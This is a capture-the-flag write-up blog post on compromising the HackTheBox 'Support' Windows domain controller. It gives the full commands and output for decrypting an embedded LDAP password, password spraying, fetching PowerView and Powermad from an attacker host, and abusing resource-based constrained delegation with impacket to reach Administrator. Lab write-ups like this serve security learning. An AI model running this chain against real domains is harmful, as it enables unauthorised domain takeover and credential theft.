---
layout: post
title: HackTheBox - Support
date: 2022-09-25 17:38 +0200
author: Arcee
tags: htb box easy windows
categories: [HackTheBox, Box]
---

![Support](/assets/img/posts/htb-support/support.png)

Easy Windows box that features kerberos resource-based constrained delegation. 

## Box Info:

Name: Support

Release date: 30-07-2022

OS: Windows

Solve date: 25-9-2022

## Enumeration

Nmap results:

```bash
$ nmap -Pn -sC -sV -p- 10.10.11.174
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 16:26 CEST
Nmap scan report for 10.10.11.174
Host is up (0.014s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-25 14:27:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
53616/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-25T14:28:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.65 seconds
```

From this we identify a domain: support.htb, we also see that there are smb shares. Which we can list:

```bash
$ smbclient -L 10.10.11.174 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

We can see support staff tools as support-tools. Which we can view using

```bash
$ smbclient //10.10.11.174/support-tools -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 949459 blocks available
```

These look like generic programmes, though UserInfo.exe.zip looks interesting. So we download it

```bash
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (2168.0 KiloBytes/sec) (average 2168.0 KiloBytes/sec)
```

We can view what is in the zip:

```bash
$ 7z l UserInfo.exe.zip 
--
Path = UserInfo.exe.zip
Type = zip
Physical Size = 277499

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-05-27 19:51:05 .....        12288         5424  UserInfo.exe
2022-03-01 20:18:50 .....        99840        41727  CommandLineParser.dll
2021-10-23 01:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
2021-10-23 01:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
2021-10-23 01:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
2021-10-23 01:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
2020-02-19 12:05:18 .....        20856        11403  System.Buffers.dll
2020-02-19 12:05:18 .....       141184        58623  System.Memory.dll
2018-05-15 15:29:44 .....       115856        32709  System.Numerics.Vectors.dll
2021-10-23 01:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
2020-02-19 12:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
2022-05-27 18:59:39 .....          563          327  UserInfo.exe.config
------------------- ----- ------------ ------------  ------------------------
2022-05-27 19:51:05             652675       274861  12 files
```

We can analyze the .exe file with DnSpy ([https://translate.google.com/website?sl=auto&tl=en&hl=nl&client=webapp&u=https://github.com/dnSpy/dnSpy](https://translate.google.com/website?sl=auto&tl=en&hl=nl&client=webapp&u=https://github.com/dnSpy/dnSpy)) 

![DnSpy1](/assets/img/posts/htb-support/dnspy1.png)

The Protected shows a .cctor() function, which if we open that we can find an encrypted password: 

![DnSpy2](/assets/img/posts/htb-support/dnspy2.png)

There is also an getPassword() function, which can probably be used to decrypt the password

![DnSpy3](/assets/img/posts/htb-support/dnspy3.png)

For this we can write a simple python script: 

```python
import base64

enc_password = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

array = base64.b64decode(enc_password)
array2 = []
for i in range(len(array)):
	array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))
print("".join(array2))
```

Which gives as a result:

```bash
$ python password.py        
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

By listing ldap with the password, we can find an info field with a password:

```bash
$ ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep info:
info: Ironside47pleasure40Watchful
```

We can abuse the name fields to create a dictionary and do a passwordspray

```bash
$ ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep name: | sed 's/^name: //' | grep -vE 'D|C|A|U' > users.txt
                                                                                                                   
$ crackmapexec winrm 10.10.11.174 -u users.txt -p Ironside47pleasure40Watchful
SMB         10.10.11.174    5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   DC               [-] support.htb\ldap:Ironside47pleasure40Watchful
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

The user support is valid, so we connect with evil-winrm and we can read the flag. 

```bash
$ evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> type ..\Desktop\user.txt
d9****************************0f
```

So we have the user flag!

## Getting root flag

Since we now have a valid user on the domain, we can perform bloodhound enum to find out the high value targets. We start by uploading PowerView.ps1 and Powermad.ps1 and importing them: 

```bash
*Evil-WinRM* PS C:\ProgramData> curl 10.10.14.5:8080/Powermad.ps1 -o Powermad.ps1
*Evil-WinRM* PS C:\ProgramData> curl 10.10.14.5:8080/PowerView.ps1 -o PowerView.ps1
*Evil-WinRM* PS C:\ProgramData> Import-Module .\Powermad.ps1
*Evil-WinRM* PS C:\ProgramData> Import-Module .\PowerView.ps1
```

Next, we create an account with the name fake01 and password 12345

```bash
*Evil-WinRM* PS C:\ProgramData> New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = fake01$
Verbose: [+] Distinguished Name = CN=fake01,CN=Computers,DC=support,DC=htb
[+] Machine account fake01 added
```

Now we get the sid of the account we created:

```bash
*Evil-WinRM* PS C:\ProgramData> Get-DomainComputer fake01 -Properties objectsid

objectsid
---------
S-1-5-21-1677581083-3380853377-188903654-5101
```

Now with the sid we can continue with the following steps:

```bash
Evil-WinRM* PS C:\ProgramData> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)"
*Evil-WinRM* PS C:\ProgramData> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\ProgramData> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\ProgramData> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

At the end point, rather than playing with rubeus to get the ticket, we can do it with impacket. 

```bash
$ impacket-getST support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

With the ticket we can connect with wmieexec and become Administrator:

```bash
$ export KRB5CCNAME=administrator.ccache             
                                                                                                                    
$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator

C:\>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
e0****************************18
```
